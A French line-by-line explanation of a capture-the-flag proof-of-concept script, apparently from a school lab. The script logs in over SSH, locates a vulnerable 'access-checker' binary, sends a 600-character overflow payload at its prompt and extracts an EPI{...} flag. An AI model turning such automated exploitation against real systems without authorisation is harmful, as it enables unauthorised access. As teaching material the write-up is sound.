# Explication détaillée - poc_challenge2.py

## Script 2 : poc_challenge2.py (Buffer Overflow sur access-checker)

### Ligne par ligne

**Ligne 1** : `#!/usr/bin/env python3` - Shebang indiquant l'interpréteur Python 3

**Ligne 2-5** : Commentaires décrivant le POC pour le Challenge 2 et la vulnérabilité (Buffer Overflow)

**Ligne 7** : `import paramiko` - Importe le module paramiko pour la connexion SSH

**Ligne 8** : `import getpass` - Importe le module pour la saisie sécurisée de mots de passe

**Ligne 9** : `import re` - Importe le module pour les expressions régulières (extraction du flag)

**Ligne 10** : `import sys` - Importe le module pour les fonctions système (exit)

**Ligne 11** : `import time` - Importe le module pour les fonctions de temps (sleep pour l'attente)

**Ligne 16** : `BINARY = "/opt/intern/access-checker"` - Variable contenant le chemin du binaire vulnérable

**Ligne 17** : `PAYLOAD = "l" * 600` - Variable contenant le payload : 600 caractères "l" pour provoquer le buffer overflow

**Ligne 22** : `def connect_ssh():` - Définit la fonction de connexion SSH

**Ligne 23** : `print("\n[*] Étape 1 : Connexion SSH...")` - Affiche un message indiquant l'étape

**Ligne 24** : `ssh_host = input("    Host (ex: ecorp.cyber.epitest.eu) : ").strip()` - Demande l'hôte SSH à l'utilisateur et retire les espaces en début et fin

**Ligne 25** : `ssh_port = int(input("    Port                             : ").strip())` - Demande le port SSH, convertit en entier et retire les espaces

**Ligne 26** : `ssh_user = input("    Utilisateur                      : ").strip()` - Demande le nom d'utilisateur et retire les espaces

**Ligne 27** : `ssh_pass = getpass.getpass("    Mot de passe                     : ")` - Demande le mot de passe de façon sécurisée (ne s'affiche pas à l'écran)

**Ligne 29** : `client = paramiko.SSHClient()` - Crée un client SSH avec paramiko

**Ligne 30** : `client.set_missing_host_key_policy(paramiko.AutoAddPolicy())` - Configure la politique pour accepter automatiquement les clés hôtes inconnues (utile pour les tests)

**Ligne 33** : `client.connect(ssh_host, port=ssh_port, username=ssh_user, password=ssh_pass)` - Établit la connexion SSH avec les paramètres fournis

**Ligne 34** : `print(f"[+] Connecté en SSH sur {ssh_host}:{ssh_port} !")` - Affiche un message de succès avec l'hôte et le port

**Ligne 35** : `return client` - Retourne l'objet client connecté

**Ligne 36** : `except Exception as e:` - Capture toute exception lors de la connexion

**Ligne 37** : `print(f"[!] Erreur SSH : {e}")` - Affiche l'erreur

**Ligne 38** : `sys.exit(1)` - Quitte le programme avec un code d'erreur

**Ligne 43** : `def find_binary(client):` - Définit la fonction pour trouver le binaire sur le serveur

**Ligne 44** : `print(f"\n[*] Étape 2 : Recherche du binaire access-checker...")` - Affiche un message indiquant l'étape

**Ligne 45** : `stdin, stdout, stderr = client.exec_command("find / -name 'access-checker' 2>/dev/null")` - Exécute la commande find pour rechercher le binaire dans tout le système de fichiers, redirigeant stderr vers /dev/null

**Ligne 46** : `result = stdout.read().decode().strip()` - Lit la sortie standard, décode les bytes en string et retire les espaces en début et fin

**Ligne 47** : `if result:` - Si un résultat est trouvé

**Ligne 48** : `print(f"[+] Binaire trouvé : {result}")` - Affiche le chemin du binaire trouvé

**Ligne 49** : `return result` - Retourne le chemin du binaire

**Ligne 50** : `print(f"[!] Binaire non trouvé, utilisation du chemin connu.")` - Affiche un message d'avertissement

**Ligne 51** : `return BINARY` - Retourne le chemin par défaut défini dans la configuration

**Ligne 56** : `def analyse_binary(client, path):` - Définit la fonction d'analyse du binaire

**Ligne 57** : `print(f"\n[*] Étape 3 : Analyse du binaire...")` - Affiche un message indiquant l'étape

**Ligne 58** : `stdin, stdout, stderr = client.exec_command(f"file {path}")` - Exécute la commande file pour identifier le type de fichier

**Ligne 59** : `print(f"[+] {stdout.read().decode().strip()}")` - Lit, décode et affiche le résultat de la commande file (ex: ELF 64-bit LSB executable)

**Ligne 64** : `def exploit(client, path):` - Définit la fonction d'exploitation du buffer overflow

**Ligne 65** : `print(f"\n[*] Étape 4 : Lancement du binaire...")` - Affiche un message indiquant l'étape

**Ligne 66** : `print(f"[*] Étape 5 : Exploitation par Buffer Overflow (payload {len(PAYLOAD)} chars)...")` - Affiche un message avec la taille du payload

**Ligne 68** : `channel = client.get_transport().open_session()` - Ouvre un nouveau canal SSH pour l'exécution de commandes

**Ligne 69** : `channel.set_combine_stderr(True)` - Combine stderr et stdout dans le même flux de sortie

**Ligne 70** : `channel.get_pty()` - Demande un pseudo-terminal (PTY) pour permettre l'interaction avec le binaire (nécessaire pour afficher le prompt)

**Ligne 71** : `channel.exec_command(path)` - Exécute le binaire spécifié par path

**Ligne 73** : `output = ""` - Initialise une chaîne vide pour stocker la sortie du binaire

**Ligne 74** : `prompt_detected = False` - Initialise un booléen pour suivre si le prompt a été détecté

**Ligne 77** : `for _ in range(50):` - Boucle 50 fois pour attendre l'apparition du prompt

**Ligne 78** : `time.sleep(0.1)` - Attend 0.1 seconde à chaque itération (total max 5 secondes)

**Ligne 79** : `if channel.recv_ready():` - Vérifie si des données sont disponibles en lecture sur le canal

**Ligne 80** : `chunk = channel.recv(4096).decode(errors="replace")` - Lit jusqu'à 4096 octets, décode en string (errors="replace" remplace les caractères invalides)

**Ligne 81** : `output += chunk` - Ajoute le chunk lu à la sortie totale

**Ligne 82** : `print(f"[~] Reçu : {chunk.strip()}")` - Affiche ce qui a été reçu (sans espaces en début/fin)

**Ligne 83** : `if "username" in chunk.lower() or ":" in chunk:` - Vérifie si le prompt contient "username" ou ":"

**Ligne 84** : `prompt_detected = True` - Marque le prompt comme détecté

**Ligne 85** : `break` - Sort de la boucle

**Ligne 87** : `if prompt_detected:` - Si le prompt a été détecté

**Ligne 88** : `print(f"[+] Prompt détecté, envoi du payload...")` - Affiche un message de succès

**Ligne 89** : `channel.sendall((PAYLOAD + "\n").encode())` - Envoie le payload suivi d'un saut de ligne, encodé en bytes

**Ligne 90** : `else:` - Sinon (prompt non détecté)

**Ligne 91** : `print(f"[!] Prompt non détecté, envoi du payload quand même...")` - Affiche un avertissement

**Ligne 92** : `channel.sendall((PAYLOAD + "\n").encode())` - Envoie le payload quand même

**Ligne 95** : `time.sleep(1)` - Attend 1 seconde pour laisser le temps au binaire de traiter le payload

**Ligne 96** : `while channel.recv_ready():` - Tant que des données sont disponibles

**Ligne 97** : `chunk = channel.recv(4096).decode(errors="replace")` - Lit les données disponibles

**Ligne 98** : `output += chunk` - Ajoute à la sortie totale

**Ligne 100** : `channel.close()` - Ferme le canal SSH

**Ligne 102** : `print(f"\n[+] Output complet :")` - Affiche un message

**Ligne 103** : `print(output)` - Affiche la sortie complète du binaire

**Ligne 104** : `return output` - Retourne la sortie pour extraction du flag

**Ligne 109** : `def extract_flag(output):` - Définit la fonction d'extraction du flag

**Ligne 110** : `print(f"\n[*] Extraction du flag...")` - Affiche un message

**Ligne 111** : `match = re.search(r'EPI\{[^}]+\}', output)` - Cherche le pattern EPI{...} dans la sortie avec une expression régulière

**Ligne 112** : `if match:` - Si le pattern est trouvé

**Ligne 113** : `return match.group(0)` - Retourne le flag complet

**Ligne 114** : `return None` - Sinon retourne None

**Ligne 119** : `def main():` - Définit la fonction principale

**Ligne 120-122** : Affiche le titre du POC

**Ligne 124** : `client = connect_ssh()` - Appelle la fonction de connexion SSH

**Ligne 125** : `binary_path = find_binary(client)` - Appelle la fonction pour trouver le binaire

**Ligne 126** : `analyse_binary(client, binary_path)` - Appelle la fonction d'analyse du binaire

**Ligne 127** : `output = exploit(client, binary_path)` - Appelle la fonction d'exploitation

**Ligne 128** : `flag = extract_flag(output)` - Appelle la fonction d'extraction du flag

**Ligne 130** : `client.close()` - Ferme la connexion SSH

**Ligne 132** : `if flag:` - Si le flag a été trouvé

**Ligne 133-135** : Affiche le flag encadré

**Ligne 137** : `else:` - Sinon

**Ligne 137** : `print("[!] Flag non trouvé dans la sortie.")` - Affiche un message d'erreur

**Ligne 139** : `print("[~] Output brut :")` - Affiche un message

**Ligne 139** : `print(repr(output))` - Affiche la représentation brute de la sortie (avec caractères d'échappement)

**Ligne 141** : `if __name__ == "__main__":` - Vérifie si le script est exécuté directement

**Ligne 142** : `main()` - Appelle la fonction principale

---

## Résumé du fonctionnement

Ce script automatise l'exploitation d'une vulnérabilité de buffer overflow sur le binaire access-checker. Il :

1. Se connecte en SSH au serveur distant avec les identifiants fournis
2. Recherche le binaire access-checker sur le système
3. Analyse le binaire pour confirmer son type (ELF)
4. Exécute le binaire via un canal SSH avec PTY pour l'interaction
5. Attend l'apparition du prompt du binaire
6. Envoie un payload de 600 caractères "l" pour provoquer un buffer overflow
7. Le buffer overflow provoque une fuite de mémoire qui révèle le flag
8. Extrait et affiche le flag EPI{...}
